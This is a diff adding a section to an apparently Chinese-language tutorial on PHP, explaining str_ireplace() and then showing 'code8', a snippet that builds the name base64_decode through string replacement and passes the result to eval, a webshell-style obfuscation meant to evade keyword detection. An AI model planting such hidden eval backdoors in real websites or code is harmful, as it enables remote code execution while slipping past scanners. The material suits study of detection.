@@ -209,5 +209,25 @@ $b = $a('code');
 eval($d=&$b);
 ```
 
+### str_ireplace()函数
+* str_ireplace() 函数替换字符串中的一些字符(不区分大小写)。
+```php
+<?php
+echo str_ireplace("boy","girl","beautiful boy");
+```
+输出:  
+
+![19](https://ws1.sinaimg.cn/large/006VEsyOgy1g0rt0ysk8kj30dy05nt9a.jpg)  
+
+### code8
+```php
+<?php
+$a = str_ireplace("uuuiii","4_decode","base6uuuiii");
+$b = $a('code');
+eval($d=&$b);
+```
+
+
+
 
 
